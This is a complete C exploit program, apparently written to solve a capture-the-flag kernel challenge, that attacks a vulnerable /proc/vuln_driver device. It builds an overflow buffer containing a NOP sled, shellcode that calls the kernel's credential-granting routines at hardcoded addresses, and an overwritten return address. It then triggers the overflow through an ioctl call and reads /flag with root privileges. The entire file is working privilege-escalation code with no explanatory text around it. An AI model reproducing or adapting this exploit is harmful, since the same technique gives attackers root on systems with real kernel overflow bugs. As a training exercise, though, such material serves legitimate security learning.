#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

char global_buf[1024];
char proc[] = "/proc/vuln_driver";
int global_fd;

void ioctl_set_msg(int fd, char *msg) {
        ioctl(fd, 1337, msg);
        close(fd);
}

void open_proc() {
        global_fd = open(proc, O_RDWR);
        if (global_fd < 0) {
                printf("problem\n");
                exit(1);
        } else {
                printf("[+] device open\n");
        }
}

void read_flag() {
        int s;
        global_fd = open("/flag", O_RDONLY);
        s = read(global_fd, global_buf, sizeof(global_buf));
        close(global_fd);
        if (s < 0) {
                printf("problem read flag\n");
        } else {
                printf("%s\n", global_buf);
        }
}

void debug(uint8_t *inp, int size) {
        for (int i = 0; i < size; i++) {
                if (i % 8 == 0) {
                        if (i != 0) {
                                printf("  <--  %#08x\n", i);
                        }
                        printf("0x");
                }
                printf("%02x", inp[i]);
                if (i == (size - 1)) {
                        printf("  <--  %#08x", i);
                }
        }
        printf("\n");
}

int main() {
        int i;
        int ii = 0;
        uint8_t payload[0x1010];

        uint8_t priv_esc[] = { 
                0x48, 0x31, 0xff,
                0x48, 0xc7, 0xc0, 0xd0, 0x90, 0x08, 0x81, 
                0xff, 0xd0,
                0x48, 0x89, 0xc7,
                0x48, 0xc7, 0xc0, 0x90, 0x8d, 0x08, 0x81,
                0xff, 0xd0,
                0xc3 };

        payload[0] = 0x00;
        payload[1] = 0x10;

        // Length satisfy
        for (i = 2; i < 10; i++) {
                payload[i] = 0x00;
        }

        // Nop sled
        for (i; i < (0x1008 - sizeof(priv_esc)); i++) {
                payload[i] = 0x90;
        }

        // The good code
        for (i; i < 0x1008; i++) {
                payload[i] = priv_esc[ii];
                ii++;
        }

        // Return address
        //for (i = 0; i < 8; i += 2) {
        //      payload[0x1008 + i] = 0xbb;
        //      payload[0x1008 + i + 1] = 0xaa;
        //}

        // ff ff c9 00 00 08 50 00
        payload[0x1008 + 7] = 0xff;
        payload[0x1008 + 6] = 0xff;
        payload[0x1008 + 5] = 0xc9;
        payload[0x1008 + 4] = 0x00;
        payload[0x1008 + 3] = 0x00;
        payload[0x1008 + 2] = 0x08;
        payload[0x1008 + 1] = 0x50;
        payload[0x1008 + 0] = 0x00;

        printf("[+] size of payload: %lu\n", sizeof(priv_esc));

        debug(payload, sizeof(payload));

        open_proc();
        ioctl_set_msg(global_fd, payload);
        read_flag();

        return 0;
}
